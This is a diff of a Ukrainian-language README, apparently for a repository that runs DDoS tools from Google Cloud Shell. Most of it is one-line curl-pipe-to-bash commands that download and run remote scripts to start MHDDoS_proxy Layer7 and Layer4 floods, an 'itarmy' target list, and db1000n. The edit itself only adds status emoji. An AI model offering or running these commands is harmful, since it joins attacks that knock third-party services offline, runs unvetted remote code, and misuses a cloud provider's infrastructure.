@@ -4,25 +4,25 @@
 ### Використовуємо https://shell.cloud.google.com/?fromcloudshell=true&show=terminal
 #
 ### Команди для встановлення та запуску MHDDoS_proxy
-**Layer7:**
+:white_check_mark:**Layer7:**
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
 ```
-**Layer4:**    
+:grey_question:**Layer4:**    
 ~~`curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L4.sh | bash`~~    
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4_tcp.sh | bash
 ```
-**All list (*--itarmy*):**    
+:white_check_mark:**All list (*--itarmy*):**    
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/itarmy.sh | bash
 ```
-~~**Розділений термінал (Layer7+Layer4):**~~    
+:grey_question:**Розділений термінал (Layer7+Layer4):**    
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash
 ```    
 #
-### Команда для встановлення та запуску db1000n
+### :white_check_mark: Команда для встановлення та запуску db1000n 
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_GShell.sh | bash
 ``` 
